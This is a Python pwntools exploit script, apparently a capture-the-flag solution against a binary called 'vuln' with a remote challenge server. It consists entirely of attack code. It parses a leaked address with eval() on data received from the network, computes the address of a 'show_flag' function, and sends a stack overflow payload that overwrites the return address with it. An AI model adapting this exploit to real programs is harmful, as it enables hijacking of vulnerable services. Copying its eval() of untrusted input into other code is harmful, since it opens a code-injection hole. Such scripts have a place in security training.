#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['terminator','-e']
context.log_level = "debug"

chall = "./vuln"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("35.200.120.35", 9003)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b main
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

p.recvuntil("cry()   | ")
show_flag = eval(p.recv(18)) - 0xc8
log.info('show_flag : 0x{:08x}'.format(show_flag))


payload = b"A" * 0x8 * 4
payload += p64(show_flag)
p.recvuntil(b"Input name:")
sleep(0.5)
p.sendline(payload)

p.interactive()
